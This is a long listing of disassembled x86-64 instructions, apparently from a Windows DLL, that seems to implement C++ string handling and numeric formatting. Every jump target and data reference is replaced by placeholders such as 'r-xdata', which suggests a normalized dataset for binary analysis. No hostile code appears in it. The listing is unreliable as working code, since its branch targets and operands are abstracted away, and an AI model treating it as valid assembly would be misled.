mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov r8 [ rcx + 0x18 ]
cmp r8 0x10
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov r8 [ rbx + 0x10 ]
mov rdx rdi
mov rcx rbx
call sub_1800029e0
test rdi rdi
je r-xdata
cmp r8 0x10
jb r-xdata
cmp rdx rax
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rcx [ rbx + 0x10 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx ] 0x0
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx ]
mov [ rax ] dil
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp r8 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov r8 rdi
mov rdx rsi
call sub_180018670
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi ] 0x0
sub rsi rax
mov r9 rdi
mov rdx rbx
mov r8 rsi
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_1800084d0
sub_180007110
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
mov rsi r8
mov r8 [ rcx + 0x10 ]
movzx r12d r9b
mov rbp rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
or rax 0xffffffffffffffff
sub rax r8
cmp rax rsi
ja r-xdata
lea rcx [ r--data ]
call sub_180016ebc
mov [ rsp + 0x30 ] rdi
test rsi rsi
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rdi [ r8 + rsi ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_1800029e0
test rdi rdi
je r-xdata
mov rax [ rbx + 0x18 ]
cmp rax 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov r8 [ rbx + 0x10 ]
lea rdx [ rcx + rbp ]
lea rcx [ rax + rbp ]
sub r8 rbp
add rcx rsi
call sub_180018670
cmp rsi 0x1
jne r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + rbp ] r12b
jmp r-xdata
mov rax [ rbx ]
mov [ rax + rbp ] r12b
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rcx [ rax + rbp ]
movsx edx r12b
mov r8 rsi
call sub_18001d7d0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_1800072d0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x38 ]
sub rsp 0x138
mov [ rbp - 0x40 ] 0xfffffffffffffffe
movaps [ rsp + 0x120 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x18 ] rax
mov [ rbp - 0x70 ] r9
mov [ rsp + 0x60 ] r8
mov [ rbp - 0x68 ] rdx
mov [ rsp + 0x78 ] rcx
movzx r15d [ rbp + 0xa0 ]
mov [ rsp + 0x5a ] r15w
mov rbx [ rbp + 0xa8 ]
mov [ rsp + 0x68 ] rbx
mov rsi [ rbp + 0xb0 ]
mov [ rbp - 0x78 ] rsi
mov rax [ rbp + 0xb8 ]
mov [ rbp - 0x80 ] rax
mov r14 [ rbp + 0xc0 ]
mov r12 [ rbp + 0xc8 ]
lea rdx [ rbp - 0x58 ]
mov rcx r9
call sub_180003910
nop
mov rcx rax
call sub_1800090d0
mov r13 rax
mov [ rbp - 0x60 ] rax
mov rdi [ rbp - 0x58 ]
test rdi rdi
je r-xdata
lea rdx [ rbp - 0x10 ]
mov rcx r13
call sub_1800088d0
nop
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x10 ]
mov [ rsp + 0x58 ] ax
mov [ rbp - 0x20 ] 0xf
xor edi edi
mov [ rbp - 0x28 ] rdi
mov [ rbp - 0x38 ] dil
mov [ rsp + 0x30 ] 0x30
mov [ rsp + 0x50 ] di
mov [ rsp + 0x70 ] edi
mov rax [ rsp + 0x78 ]
add rax 0x10
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x70 ]
lea r8d [ rdi + 0x1 ]
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x50 ]
call sub_180017a9c
movzx r11d [ rbx ]
cmp r11b 0x2b
je r-xdata
xor edx edx
lea rcx [ rsp + 0x50 ]
call sub_18001775c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
mov eax 0x1
cmp r11b 0x2d
mov eax edi
jne r-xdata
xor eax eax
mov ebx eax
cmp [ rdi + 0x8 ] rax
cmove rbx rdi
lea rcx [ rsp + 0x50 ]
call sub_18001778c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rdi [ rsp + 0x68 ]
lea rax [ rbp - 0x10 ]
cmp r8 0x10
cmovae rax rdx
cmp [ rax ] r9b
jle r-xdata
movsxd r13 eax
call sub_180018c10
mov rcx [ rax ]
movzx eax [ rcx ]
mov [ rsp + 0x54 ] al
mov [ rsp + 0x55 ] 0x65
mov r8 r12
mov edx 0x65
mov rcx rbx
call sub_180018bf4
mov rdi rax
movsx edx [ rsp + 0x54 ]
mov r8 r12
mov rcx rbx
call sub_180018bf4
mov rbx rax
test rax rax
mov r9d 0x0
cmove r14 r9
lea rcx [ rbp - 0x10 ]
mov rdx [ rbp - 0x10 ]
mov r8 [ rbp + 0x8 ]
cmp r8 0x10
cmovae rcx rdx
cmp [ rcx ] 0x7f
je r-xdata
mov rbx [ rsp + 0x68 ]
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
mov rsi r9
cmp rsi rax
jbe r-xdata
mov r8 r12
mov r12 [ rsp + 0x68 ]
mov rdx r12
lea rcx [ rbp - 0x38 ]
call sub_180008390
test rdi rdi
jne r-xdata
movsx edx [ rsp + 0x54 ]
mov r8 r12
mov rcx rdi
call sub_180018bf4
mov r13 rax
movzx edi [ rsp + 0x50 ]
test rax rax
je r-xdata
cmp eax 0x100
je r-xdata
sub rsi rax
jmp r-xdata
test rbx rbx
jne r-xdata
mov r8b 0x30
mov rdx r14
lea rcx [ rbp - 0x38 ]
call sub_180002ea0
jmp r-xdata
mov rbx [ rsp + 0x68 ]
mov r9 [ rsp + 0x68 ]
sub r13 r9
inc r13
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
lea rax [ r13 - 0x1 ]
movzx ecx [ rsp + 0x58 ]
mov [ rsp + 0x28 ] cx
mov [ rsp + 0x20 ] rax
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x50 ]
mov rcx [ rsp + 0x78 ]
call sub_1800086e0
mov r11 rax
mov rax [ rax ]
mov [ rbx ] rax
mov rax [ r11 + 0x8 ]
mov [ rbx + 0x8 ] rax
movups xmm6 [ r11 ]
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
mov r8 [ rbp - 0x78 ]
test r8 r8
je r-xdata
test r13 r13
je r-xdata
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rsi rsi
je r-xdata
mov eax [ rcx + 0x18 ]
and eax 0x1c0
mov rbx [ rsp + 0x60 ]
cmp eax 0x40
je r-xdata
sub rdi r12
mov r9b 0x30
mov r8 r14
mov rdx rdi
lea rcx [ rbp - 0x38 ]
call sub_180007110
mov r8b 0x30
mov rdx rsi
lea rcx [ rbp - 0x38 ]
call sub_180002ea0
xor eax eax
mov esi eax
lea rcx [ rbp - 0x38 ]
test rbx rbx
jne r-xdata
mov r13 [ rsp + 0x60 ]
movups xmm0 [ r13 ]
movaps [ rsp + 0x40 ] xmm0
movzx eax [ rsp + 0x58 ]
mov [ rsp + 0x28 ] ax
mov [ rsp + 0x20 ] r12
mov r9 rbx
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x50 ]
mov rcx [ rsp + 0x78 ]
call sub_1800086e0
mov r11 rax
mov rax [ rax ]
mov [ r13 ] rax
mov rax [ r11 + 0x8 ]
mov [ r13 + 0x8 ] rax
movups xmm0 [ r11 ]
movaps [ rsp + 0x40 ] xmm0
test r14 r14
je r-xdata
sub r13 rbx
inc r13
mov rax [ rsp + 0x60 ]
movups xmm0 [ rax ]
movaps [ rsp + 0x40 ] xmm0
lea rax [ r13 - 0x1 ]
movzx ecx [ rsp + 0x58 ]
mov [ rsp + 0x28 ] cx
mov [ rsp + 0x20 ] rax
mov r9 rbx
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x50 ]
mov rcx [ rsp + 0x78 ]
call sub_1800086e0
mov r11 rax
mov rax [ rax ]
mov rcx [ rsp + 0x60 ]
mov [ rcx ] rax
mov rax [ r11 + 0x8 ]
mov [ rcx + 0x8 ] rax
movups xmm6 [ r11 ]
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
test r14 r14
je r-xdata
mov rax [ rsp + 0x60 ]
movups [ rax ] xmm6
movaps [ rsp + 0x40 ] xmm6
mov rcx [ rbp - 0x60 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
movzx r11d ax
test rbx rbx
je r-xdata
mov r15d 0xffff
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rsi rsi
je r-xdata
movups xmm6 [ rbx ]
movaps [ rsp + 0x40 ] xmm6
movzx eax [ rdi ]
mov [ rsp + 0x30 ] al
mov [ rsp + 0x70 ] r9w
mov [ rsp + 0x74 ] r9d
mov rax [ rsp + 0x78 ]
add rax 0x10
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x74 ]
mov r8d 0x1
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x70 ]
call sub_180017a9c
mov rcx [ rsp + 0x48 ]
test rcx rcx
je r-xdata
movups [ rbx ] xmm0
xor eax eax
mov esi eax
jmp r-xdata
mov rbx [ rsp + 0x48 ]
sub rbx r12
lea rdx [ rbx + 0x1 ]
mov r9b 0x30
mov r8 [ rbp - 0x80 ]
call sub_180007110
mov r9b 0x30
mov r8 rsi
mov rdx rbx
lea rcx [ rbp - 0x38 ]
call sub_180007110
xor r14d r14d
mov [ rbp - 0x80 ] r14
mov r8b 0x30
mov rdx rsi
call sub_180002ea0
xor r14d r14d
jmp r-xdata
movups [ r13 ] xmm0
mov rax [ rbp - 0x70 ]
xor edi edi
mov [ rax + 0x28 ] rdi
movups xmm0 [ r13 ]
movaps [ rsp + 0x40 ] xmm0
test rsi rsi
je r-xdata
mov rbx [ rsp + 0x48 ]
mov r13d 0xffff
nop [ rax ] eax
movups [ rcx ] xmm6
xor edx edx
mov r14d edx
movaps [ rsp + 0x40 ] xmm6
mov rax [ rbp - 0x70 ]
test [ rax + 0x18 ] 0x4
lea rcx [ r--data ]
lea rax [ r--data ]
cmovne rax rcx
movzx eax [ rax ]
mov [ rsp + 0x30 ] al
mov [ rsp + 0x50 ] dx
mov [ rsp + 0x74 ] edx
mov rax [ rsp + 0x78 ]
add rax 0x10
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x74 ]
lea r8d [ rdx + 0x1 ]
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x50 ]
call sub_180017a9c
test rbx rbx
je r-xdata
mov r15d 0xffff
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rbx [ rsp + 0x48 ]
nop [ rax + rax ] ax
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
movzx r8d [ rsp + 0x70 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
lea rdi [ rbp - 0x38 ]
cmp r8 0x10
cmovae rdi [ rbp - 0x38 ]
mov [ rsp + 0x68 ] rdi
mov rsi r14
xor r9d r9d
jmp r-xdata
nop
mov [ rbp - 0x78 ] r14
lea rdi [ rbp - 0x10 ]
cmp [ rbp + 0x8 ] 0x10
cmovae rdi [ rbp - 0x10 ]
lea rcx [ rbp - 0x38 ]
cmp [ rbp - 0x20 ] 0x10
cmovae rcx [ rbp - 0x38 ]
lea rdx [ rsp + 0x54 ]
call sub_180018c48
mov rsi rax
movzx ecx [ rdi ]
mov r8 [ rbp - 0x20 ]
mov r12 [ rbp - 0x28 ]
cmp cl 0x7f
je r-xdata
mov rbx [ rbp - 0x68 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x20 ] 0x10
jb r-xdata
mov rbx [ rsp + 0x48 ]
nop [ rax ] eax
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
movzx r8d [ rsp + 0x50 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] r14
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movups [ rax ] xmm6
mov rbx [ rsp + 0x68 ]
add rbx r13
mov [ rsp + 0x68 ] rbx
sub r12 r13
jmp r-xdata
mov rbx [ rsp + 0x48 ]
mov r15d 0xffff
nop
mov rax [ rbx ]
movzx edx r11w
mov rcx rbx
call [ rax + 0x18 ]
movzx r11d ax
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
movzx r15d [ rsp + 0x5a ]
mov rax [ rbx ]
movzx edx di
mov rcx rbx
call [ rax + 0x18 ]
mov r8 [ rbp - 0x78 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov rbx [ rsp + 0x60 ]
mov rax [ rbx ]
movzx edx r15w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
lea rax [ r12 + r14 ]
add rax [ rbp - 0x80 ]
add rax rsi
mov rcx [ rbp - 0x70 ]
mov rsi [ rcx + 0x28 ]
test rsi rsi
jle r-xdata
movsx rdx cl
mov rax rsi
sub rax r13
cmp rdx rax
jae r-xdata
mov [ rbp - 0x20 ] 0xf
mov [ rbp - 0x28 ] rdi
mov [ rbp - 0x38 ] 0x0
cmp [ rbp + 0x8 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_180018b3c
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] rdi
je r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov r13 [ rsp + 0x60 ]
mov rax [ rbx ]
movzx edx di
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rbx ]
movzx edx r8w
mov rcx rbx
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rbx + 0x60 ]
cmp [ rax ] r14d
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
movzx r15d [ rsp + 0x5a ]
mov rcx [ rsp + 0x60 ]
mov rax [ rbx ]
movzx edx di
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov r8 r12
mov edx 0x65
mov rcx rbx
call sub_180018bf4
mov r13 rax
test rax rax
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rsp + 0x60 ]
movups [ rax ] xmm6
movaps [ rsp + 0x40 ] xmm6
mov r8 [ rbp - 0x80 ]
test r8 r8
je r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r11w
jmp r-xdata
dec r8
mov [ rbp - 0x78 ] r8
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
movzx eax di
jmp r-xdata
test rbx rbx
je r-xdata
jmp r-xdata
mov rax [ rbx ]
movzx edx r15w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movups [ rbx ] xmm6
inc rdi
mov [ rsp + 0x68 ] rdi
dec r12
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
dec rsi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r15w
movzx eax r15w
jmp r-xdata
sub rsi rdx
cmp r12 rsi
jb r-xdata
mov rax rbx
mov rcx [ rbp + 0x18 ]
xor rcx rsp
call sub_180018450
movaps xmm6 [ rsp + 0x120 ]
add rsp 0x138
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp - 0x10 ]
call j_sub_180018b3c
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov rax [ rbx ]
movzx edx r15w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] edi
jle r-xdata
dec r14
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
movzx eax di
jmp r-xdata
mov rax [ rsp + 0x60 ]
movups [ rax ] xmm6
mov rbx [ rsp + 0x68 ]
add rbx r13
sub r12 r13
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
dec r14
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
movzx eax di
jmp r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
movzx r15d [ rsp + 0x5a ]
mov rax [ rsp + 0x60 ]
mov rax [ rbx ]
movzx edx di
mov rcx rbx
call [ rax + 0x18 ]
mov r8 [ rbp - 0x80 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov eax 0xffff
cmp ax r11w
jne r-xdata
cmp r15w ax
jne r-xdata
dec rsi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r15w
movzx eax r15w
jmp r-xdata
mov eax 0xffff
cmp ax r8w
jne r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
lea rcx [ r--data ]
call sub_180016ebc
or rax 0xffffffffffffffff
sub rax r12
cmp rax 0x1
jbe r-xdata
dec rsi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r15w
movzx eax r15w
jmp r-xdata
cmp r13w ax
jne r-xdata
mov eax 0xffff
cmp ax r8w
jne r-xdata
cmp r15w ax
jne r-xdata
dec r8
mov [ rbp - 0x80 ] r8
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
movzx eax di
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
lea rcx [ r--data ]
call sub_180016e60
lea rbx [ r12 + 0x1 ]
cmp rbx 0xfffffffffffffffe
ja r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp r15w ax
jne r-xdata
lea rcx [ r--data ]
call sub_180016e60
cmp r8 rbx
jae r-xdata
test rbx rbx
jne r-xdata
mov r8 r12
mov rdx rbx
lea rcx [ rbp - 0x38 ]
call sub_1800029e0
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x28 ] r14
lea rax [ rbp - 0x38 ]
cmp r8 0x10
cmovae rax [ rbp - 0x38 ]
mov [ rax ] bl
mov r12 [ rbp - 0x28 ]
mov r8 [ rbp - 0x20 ]
test rbx rbx
lea rax [ rdi + 0x1 ]
cmp [ rax ] 0x0
cmovg rdi rax
movzx ecx [ rdi ]
cmp cl 0x7f
jne r-xdata
lea rdx [ rbp - 0x38 ]
mov rax [ rbp - 0x38 ]
cmp r8 0x10
cmovae rdx rax
lea rcx [ rbp - 0x38 ]
cmovae rcx rax
sub r12 rsi
add rdx rsi
lea rcx [ rcx + rsi + 0x1 ]
mov r8 r12
call sub_180018670
lea r11 [ rbp - 0x38 ]
cmp [ rbp - 0x20 ] 0x10
cmovae r11 [ rbp - 0x38 ]
mov [ r11 + rsi ] 0x0
mov [ rbp - 0x28 ] rbx
lea rax [ rbp - 0x38 ]
cmp [ rbp - 0x20 ] 0x10
cmovae rax [ rbp - 0x38 ]
mov [ rax + rbx ] 0x0
mov r8 [ rbp - 0x20 ]
mov r12 [ rbp - 0x28 ]
test cl cl
jle r-xdata
jmp r-xdata
sub_180007e10
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x7 ]
sub rsp 0xc8
mov [ rbp - 0x49 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x9 ] rax
mov [ rbp - 0x79 ] r9
mov [ rsp + 0x30 ] r8
mov [ rbp - 0x51 ] rdx
mov [ rbp - 0x61 ] rcx
movzx esi [ rbp + 0x6f ]
mov r15 [ rbp + 0x77 ]
mov r14 [ rbp + 0x7f ]
lea rdx [ rbp - 0x59 ]
mov rcx r9
call sub_180003910
nop
mov rcx rax
call sub_1800090d0
mov r13 rax
mov [ rbp - 0x71 ] rax
mov r12d 0x1
mov rdi [ rbp - 0x59 ]
test rdi rdi
je r-xdata
lea rdx [ rbp - 0x31 ]
mov rcx r13
call sub_1800088d0
nop
movzx eax [ r15 ]
cmp al 0x2b
je r-xdata
xor edx edx
lea rcx [ rsp + 0x40 ]
call sub_18001775c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
movsxd r13 r12d
lea rax [ rbp - 0x31 ]
mov rcx [ rbp - 0x31 ]
mov rdx [ rbp - 0x19 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x7f
je r-xdata
cmp al 0x2d
je r-xdata
xor ebx ebx
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rsp + 0x40 ]
call sub_18001778c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rbx [ rbp - 0x79 ]
mov rdi [ rbx + 0x28 ]
test rdi rdi
jle r-xdata
lea rax [ rbp - 0x31 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x0
jle r-xdata
cmp al 0x30
jne r-xdata
mov rax [ rbx ]
mov edx r12d
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
xor edi edi
cmp rdi r14
jbe r-xdata
lea r12 [ rbp - 0x31 ]
cmp rdx 0x10
cmovae r12 rcx
mov rdi r14
movzx eax [ r12 ]
cmp al 0x7f
je r-xdata
xor r12d r12d
movzx eax [ r15 + 0x1 ]
cmp al 0x78
je r-xdata
mov r13d 0xffff
movups xmm0 [ r12 ]
movaps [ rsp + 0x30 ] xmm0
cmp eax 0x100
je r-xdata
sub rdi r14
jmp r-xdata
test al al
jle r-xdata
mov r12d 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov rbx [ rbp - 0x51 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x19 ] 0x10
jb r-xdata
mov rbx [ rbp - 0x69 ]
mov [ rsp + 0x20 ] r13
mov r9 r15
lea r8 [ rsp + 0x30 ]
lea rdx [ rbp - 0x41 ]
mov rcx [ rbp - 0x61 ]
call sub_1800085e0
mov r11 rax
mov rax [ rax ]
mov [ r12 ] rax
mov rax [ r11 + 0x8 ]
mov [ r12 + 0x8 ] rax
add r15 r13
sub r14 r13
movups xmm0 [ r11 ]
movaps [ rsp + 0x30 ] xmm0
mov r13d 0xffff
test rdi rdi
je r-xdata
test rdi rdi
je r-xdata
mov eax [ rbx + 0x18 ]
and eax 0x1c0
mov r12 [ rsp + 0x30 ]
cmp eax 0x40
je r-xdata
movsx rcx al
mov rax rdi
sub rax r13
cmp rcx rax
jae r-xdata
mov rax rbx
mov rcx [ rbp - 0x9 ]
xor rcx rsp
call sub_180018450
add rsp 0xc8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp - 0x31 ]
call j_sub_180018b3c
mov [ rbp - 0x71 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movups [ r12 ] xmm0
xor edi edi
jmp r-xdata
mov rbx [ rsp + 0x38 ]
movups [ r12 ] xmm0
xor edi edi
jmp r-xdata
mov rbx [ rsp + 0x38 ]
nop
sub rdi rcx
mov rdx r14
sub rdx rdi
inc rdx
lea rbx [ r15 + rdi ]
lea rcx [ r15 + rdi + 0x1 ]
mov r9 rdx
mov r8 rbx
call sub_180018b7c
mov [ rbx ] 0x0
inc r14
lea rax [ r12 + 0x1 ]
cmp [ rax ] 0x0
cmovg r12 rax
movzx eax [ r12 ]
cmp al 0x7f
jne r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rbp - 0x71 ]
mov rax [ rbx ]
movzx edx si
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movups xmm0 [ r12 ]
movaps [ rsp + 0x30 ] xmm0
mov rcx [ rbp - 0x71 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov [ rsp + 0x28 ] ax
mov [ rsp + 0x20 ] r14
mov r9 r15
lea r8 [ rsp + 0x30 ]
lea rdx [ rbp - 0x41 ]
mov rcx [ rbp - 0x61 ]
call sub_1800086e0
mov r11 rax
mov rax [ rax ]
mov [ r12 ] rax
mov rax [ r11 + 0x8 ]
mov [ r12 + 0x8 ] rax
mov [ rbx + 0x28 ] 0x0
movups xmm0 [ r12 ]
movaps [ rbp - 0x71 ] xmm0
test rdi rdi
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] si
movzx eax si
jmp r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
mov rbx [ rbp - 0x79 ]
mov rax [ rbx ]
movzx edx si
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
mov rbx [ rbp - 0x79 ]
mov rax [ rbx ]
movzx edx si
mov rcx rbx
